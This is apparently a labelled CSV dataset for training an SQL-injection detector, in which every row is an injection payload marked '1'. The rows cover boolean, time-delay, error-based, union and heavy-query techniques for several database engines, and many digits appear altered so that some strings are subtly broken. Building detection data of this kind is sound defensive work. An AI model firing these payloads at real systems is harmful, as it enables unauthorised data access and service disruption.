Sentence,Label
1  )   where 1179  =  1179,1
"1"" and   (  7424  =  2381  )  *2381 and ""dvju""  =  ""dvju",1
1'+  (  select 'vtyw' where 7951  =  7951 order by 1--,1
"1""   )    )    as paep where 8947  =  8947 and   (  select 9167 from  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  9167  =  9167,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",1
1 and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # sipo,1
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,1  )  ,511111111  )  ,null  )   else char  (  118  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1
"1""   )    )    and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   ""qnqb"" like ""qnqb",1
1'+  (  select 'jmdl' where 7827  =  7827,1
1  )   as qwsa where 2874  =  2874,1
1'   )    )    and 7231  =  2517,1
1'  )   where 8291  =  8291,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )    and ""ejmj"" like ""ejmj",1
1  )   as ryks where 1196  =  1196,1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5-- mkoo",1
1%'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1
"1%""   )    )     )   and sleep  (  5  )   and    (    (     (  ""%""  =  """,1
"1""  )   where 1416  =  1416 union all select null,null,null#",1
"1'   )    )    as agdn where 8442  =  8442 and 3824  =  benchmark  (  5111111,md5  (  1x76555642   )    )   --",1
1  )   where 5125  =  5125,1
"1%""  )   union all select null,null,null,null,null#",1
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null--",1
"-2247'  )   union all select 1212,1212,1212,1212,1212#",1
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  111  )  ||chr  (  68  )  ,5  )  --",1
"1"" and 6637  =  2321",1
"select benchmark  (  5111111,md5  (  1x4c4d6142   )    )    and    (    (     (  'lqwz'  =  'lqwz",1
"1%'   )    )    and 2388  =  benchmark  (  5111111,md5  (  1x6d457153   )    )   #",1
"-1551%""   )    )     )   order by 1--",1
"1%'   )    )    and elt  (  1211  =  1211,sleep  (  5   )    )    and    (    (   '%'  =  '",1
"1"" where 7115  =  7115",1
"1%'   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  '%'  =  '",1
-6722'  )   order by 1#,1
"1"" and exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8191  =  8191,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )   ",1
"1"" and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vziz""  =  ""vziz",1
"1"" and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
-4835   )    )     )   or   (  4219  =  2181  )  *2181 and    (    (     (  8536  =  8536,1
"1'   )    )    as yyja where 4321  =  4321 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"select sleep  (  5  )   and    (    (   ""%""  =  """,1
"1%""   )    )    and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1  )   or char  (  75  )  ||char  (  71  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )  --",1
"1""  )   where 4138  =  4138 or 4241  =    (  select 4241 from pg_sleep  (  5   )    )   --",1
"1""   )    )    and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""bcxh"" like ""bcxh",1
"1' or elt  (  6272  =  6272,sleep  (  5   )    )    and 'fvtf' like 'fvtf",1
1 where 5443  =  5443,1
"1"" procedure analyse  (  extractvalue  (  5841,concat  (  1x5c,1x7171716a71,  (  select   (  case when   (  5841  =  5841  )   then 1 else 1 end   )    )   ,1x717a767a71   )    )   ,1  )  ",1
1  )   as mixt where 1185  =  1185 or sleep  (  5  )  --,1
1'   )    )     )   union all select null--,1
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )   and   (  ""gcnq"" like ""gcnq",1
"1'+  (  select 'rpbx' where 6748  =  6748 and elt  (  4249  =  4249,7259   )    )   +'",1
"-5573'  )   union all select 2866,2866,2866,2866,2866,2866,2866,2866,2866--",1
"-5811 union all select 6317,6317,6317,6317,6317,6317,6317--",1
"1  )   as otsb where 8381  =  8381 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  91  )  ||chr  (  119  )  ,5  )  --",1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )     )  +'",1
"-5652%'  )   union all select 4447,4447,4447,4447,4447,4447,4447,4447,4447--",1
1  )   where 6884  =  6884 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1' or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1""   )    )    as zgig where 5748  =  5748 and 6155  =  ctxsys.drithsx.sn  (  6155,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  6155  =  6155  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
1'||  (  select 'zwcp' where 3333  =  3333,1
select   (  case when   (  8916  =  1357  )   then 8916 else 8916*  (  select 8916 from information_schema.character_sets  )   end  )  #,1
"-1313' union all select 4841,4841#",1
"1%'   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
1'  )   where 7541  =  7541,1
"1'  )   and updatexml  (  3393,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,1x717a767a71  )  ,1161  )   and   (  'cfzp' like 'cfzp",1
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 1x28 end   )    )    and    (    (     (  'vtoi' like 'vtoi,1
-8397'   )    )     )   or 2171  =  4788,1
"-8213""  )   union all select 6394,6394,6394,6394,6394--",1
"1%'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,1  )  ,5111111111  )  ,null  )   and   (  '%'  =  '",1
"1""   )    )     )   or row  (  1145,7562  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  1145  =  1145,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3151 union select 1211  )  a group by x  )   and    (    (     (  ""hbgr"" like ""hbgr",1
"1""  )   and 6511  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  ""ajuh""  =  ""ajuh",1
"-1512"" union all select 9688,9688,9688,9688,9688,9688,9688,9688,9688,9688--",1
-3535%'   )    )     )   or 5615  =  4661 and    (    (     (  '%'  =  ',1
"1  )   where 5378  =  5378 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,1x717a767a71,1x78   )    )   s  )  , 8446744173719551611, 8446744173719551611   )    )     )  --",1
1'+  (  select 'zgtu' where 8419  =  8419,1
1   )    )     )   and 8991  =  4775 and    (    (     (  1894  =  1894,1
end and   (  '%'  =  ',1
"1"" where 5416  =  5416 and extractvalue  (  7982,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,1x717a767a71   )    )   --",1
"-3865""  )   where 3559  =  3559 union all select 3559,3559,3559,3559,3559,3559,3559--",1
1%'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  '%'  =  ',1
"1%'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   '%'  =  '",1
1'   )    )    as pdcl where 6964  =  6964,1
"-9514%""   )    )    or 8198  =  7472",1
"-1956""  )   where 1448  =  1448 or 3441  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3441  =  3441  )   then 1 else 1 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
1%'  )   and 4595  =  4595#,1
1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
"1 and make_set  (  8413  =  8413,8899  )  -- rbxf",1
"1"" and make_set  (  4214  =  9513,9513  )   and ""phjg"" like ""phjg",1
1%'  )   union all select null--,1
"1' or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"-6527'   )    )    union all select 5153,5153,5153,5153--",1
1' where 8864  =  8864,1
"1  )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  5132  =  5132",1
1'   )    )    union all select null--,1
select case when 2195  =  9174 then 1 else null end--,1
1'||  (  select 'qstz' where 6835  =  6835,1
-4961'  )   or 3138  =  3138,1
"-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",1
"1'  )   where 6214  =  6214 procedure analyse  (  extractvalue  (  9255,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x52515a51   )    )      )    )     )  ,1  )  --",1
"1""   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  1x7171716a71,  (  select   (  elt  (  6271  =  6271,1   )    )     )  ,1x717a767a71,1x78   )    )   x   )    )    and    (    (     (  ""uzjn""  =  ""uzjn",1
"1'||  (  select 'osux' from dual where 7166  =  7166 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   ||'",1
"1%'   )    )    or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,1
"-5911 union all select 2245,2245,2245,2245,2245,2245#",1
"1'||  (  select 'scba' where 9179  =  9179 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )   --",1
-8199%'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   '%'  =  ',1
"-3733'   )    )    or 5123  =  ctxsys.drithsx.sn  (  5123,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  5123  =  5123  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'ybgd'  =  'ybgd",1
"1""  )   where 5197  =  5197 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  #,1
"1"" and sleep  (  5  )   and ""masm""  =  ""masm",1
1'  )   as hcpp where 1863  =  1863,1
"-4828'+  (  select qxnw where 9488  =  9488 union all select 9488,9488--",1
"1"" and 6511  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and ""hcjz"" like ""hcjz",1
"1' in boolean mode  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   --",1
"1'  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,1  )  ,5111111111  )  ,null  )  ",1
"-3711   )    )    union all select 5771,5771,5771,5771,5771,5771,5771#",1
1'  )   where 7537  =  7537 and 2116  =  2116,1
"-1272' or 1 group by concat  (  1x7171716a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 1 end   )    )   ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )    having min  (  1  )  #",1
"1""  )   where 8417  =  8417 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )     )   and elt  (  1211  =  1211,sleep  (  5   )    )    and    (    (     (  ""felm""  =  ""felm",1
"-8792 union all select 1246,1246,1246,1246,1246,1246,1246--",1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )  # gkkx,1
"1'   )    )    as jvwq where 6596  =  6596 and 3212  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   --",1
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1
1%' and 9198  =  9198--,1
"1'||  (  select 'fdkl' where 4572  =  4572 union all select null,null,null,null,null,null,null,null,null#",1
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""awyk"" like ""awyk",1
1%'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  61  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1
"1"" and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and ""xhvo""  =  ""xhvo",1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,1  )  ,5111111111  )  ,null  )  ",1
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""ekbq""  =  ""ekbq",1
"1   )    )    and elt  (  1211  =  1211,sleep  (  5   )    )    and    (    (   5874  =  5874",1
"1"" where 7828  =  7828",1
1'||  (  select 'lljg' from dual where 7631  =  7631,1
"-7551 or elt  (  6911  =  7195,7195  )  ",1
"select * from generate_series  (  1134,1134,case when   (  1134  =  4919  )   then 1 else 1 end  )   limit 1--",1
1  )   as iknl where 3885  =  3885 rlike sleep  (  5  )  #,1
"1'   )    )    as oocd where 2919  =  2919 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  511111111/2   )    )      )    )   --",1
"select * from generate_series  (  3186,3186,case when   (  3186  =  3327  )   then 1 else 1 end  )   limit 1--",1
if  (  3245  =  6168  )   select 3245 else drop function nafj--,1
"1%""   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and    (    (     (  ""%""  =  """,1
1'+  (  select xzse where 4531  =  4531,1
1  )   where 7165  =  7165 and sleep  (  5  )  #,1
1'  )   where 3588  =  3588,1
"1' where 2391  =  2391 union all select null,null,null,null,null,null,null,null,null,null--",1
"1""  )   as lgxc where 1117  =  1117 union all select null,null,null,null,null,null,null,null#",1
1%'  )   and sleep  (  5  )  #,1
"1%'   )    )    or extractvalue  (  1297,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,1x717a767a71   )    )    and    (    (   '%'  =  '",1
"1' union all select null,null,null,null,null#",1
"1,  (  select   (  case when   (  1571  =  1571  )   then   (  select 1571 from pg_sleep  (  5   )    )    else 1/  (  select 1  )   end   )    )   ",1
"1'||  (  select 'lstx' from dual where 2972  =  2972 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1
1 where 2649  =  2649 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --,1
"1%""   )    )    union all select null#",1
"1'   )    )     )   and elt  (  1211  =  1211,sleep  (  5   )    )    and    (    (     (  'aiuy'  =  'aiuy",1
-4557%'   )    )    or 4537  =  3411 and    (    (   '%'  =  ',1
1'+  (  select idnb where 2338  =  2338,1
"1'   )    )     )   or row  (  1145,7562  )  >  (  select count  (  *  )  ,concat  (  1x7171716a71,  (  select   (  elt  (  1145  =  1145,1   )    )     )  ,1x717a767a71,floor  (  rand  (  1  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3151 union select 1211  )  a group by x  )   and    (    (     (  'aduc'  =  'aduc",1
"1%""  )   and 6155  =  ctxsys.drithsx.sn  (  6155,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  6155  =  6155  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""%""  =  """,1
"1%'  )   and elt  (  1211  =  1211,sleep  (  5   )    )    and   (  '%'  =  '",1
"1""   )    )    as uxnc where 8141  =  8141 and 9198  =  9198--",1
1'   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 1x28 end   )    )    and    (    (     (  'ywbs'  =  'ywbs,1
-7442  )   or 3391  =  7492,1
"1%'  )   union all select null,null,null,null,null,null,null,null--",1
1  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    ) ,1
-1257'  )   order by 1#,1
1'  )   where 9317  =  9317 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
"-4739'   )    )    union all select 6585,6585,6585,6585,6585--",1
"1'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )    and    (    (   'uorw' like 'uorw",1
"-3472' or 1571  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  1571  =  1571  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1
"1'   )    )    as wves where 2641  =  2641 and 2388  =  benchmark  (  5111111,md5  (  1x6d457153   )    )   #",1
"1""  )   as yphz where 8174  =  8174 union all select null,null,null,null,null,null,null--",1
"1%""  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",1
"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",1
"-6546""  )   order by 1#",1
"1%' or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-9132   )    )    union all select 8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
-6792   )    )    as zlho where 4758  =  4758 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  116  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
"1'  )   and char  (  121  )  ||char  (  116  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,1  )  ,5111111111  )  ,null  )  ",1
"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 1  )   end   )    )   ",1
"1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",1
select   (  case when   (  2783  =  9216  )   then 1 else 2783*  (  select 2783 from master..sysdatabases  )   end  )  --,1
"-2643%"" union all select 7779,7779--",1
"1%"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  113  )  ,5  )   and ""%""  =  """,1
"-1526'   )    )    or elt  (  1132  =  1132,3623  )   and    (    (   'xpob'  =  'xpob",1
1 where 1931  =  1931 and sleep  (  5  )  --,1
1' or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1
"-4515""  )   or elt  (  4545  =  2519,2519  )   and   (  ""lglx""  =  ""lglx",1
"1%""   )    )     )   and make_set  (  8191  =  7813,7813  )   and    (    (     (  ""%""  =  """,1
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1
"1""  )   where 5491  =  5491",1
"1%""  )   procedure analyse  (  extractvalue  (  9627,concat  (  1x5c,  (  benchmark  (  5111111,md5  (  1x4b774c75   )    )      )    )     )  ,1  )  #",1
"1'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  112  )  ||char  (  72  )   end  )   from   (  values  (  1   )    )     )  ",1
"1""   )    )    and char  (  121  )  ||char  (  116  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,1  )  ,5111111111  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",1
"1%'   )    )    or 8514  =  benchmark  (  5111111,md5  (  1x544d5a4c   )    )   #",1
-8625 or 3176  =  2519# fvgl,1
"1',iif  (  9496  =  4153,1,1/1  )  ",1
"1' where 6963  =  6963 and char  (  119  )  ||char  (  79  )  ||char  (  71  )  ||char  (  91  )    =  regexp_substring  (  repeat  (  right  (  char  (  5112  )  ,1  )  ,5111111111  )  ,null  )  --",1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",1
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 1 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'mptm'  =  'mptm,1
"1""   )    )    as jucs where 6836  =  6836",1
"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%""  =  """,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""rukx"" like ""rukx",1
" end and    (    (     (  ""memh"" like ""memh",1
"1"" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 1x28 end   )    )    and ""qfhv""  =  ""qfhv",1
-9553   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  116  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 1 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   5299  =  5299,1
"1"" and 4595  =  4595#",1
1  )   where 2183  =  2183,1
"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""ctzh""  =  ""ctzh",1
"1""   )    )     )   and extractvalue  (  7982,concat  (  1x5c,1x7171716a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,1x717a767a71   )    )    and    (    (     (  ""obau""  =  ""obau",1
"1  )   as kqas where 7312  =  7312 and 8417  =    (  select count  (  *  )   from generate_series  (  1,5111111   )    )   --",1
"1'+  (  select papc where 8911  =  8911 and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1%""   )    )     )   and 9661  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"-6158""   )    )     )   or 8571  =  8571--",1
"1'  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )   and   (  'pbqg'  =  'pbqg",1
"1""  )   as sstd where 9629  =  9629 or updatexml  (  1818,concat  (  1x2e,1x7171716a71,  (  select   (  elt  (  1818  =  1818,1   )    )     )  ,1x717a767a71  )  ,8666  )  --",1
"1'+  (  select 'ycvl' where 8415  =  8415 or char  (  119  )  ||char  (  111  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,1  )  ,5111111111  )  ,null  )  --",1
"1%'   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,1  )  ,511111111  )  ,null  )   and    (    (     (  '%'  =  '",1
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,1
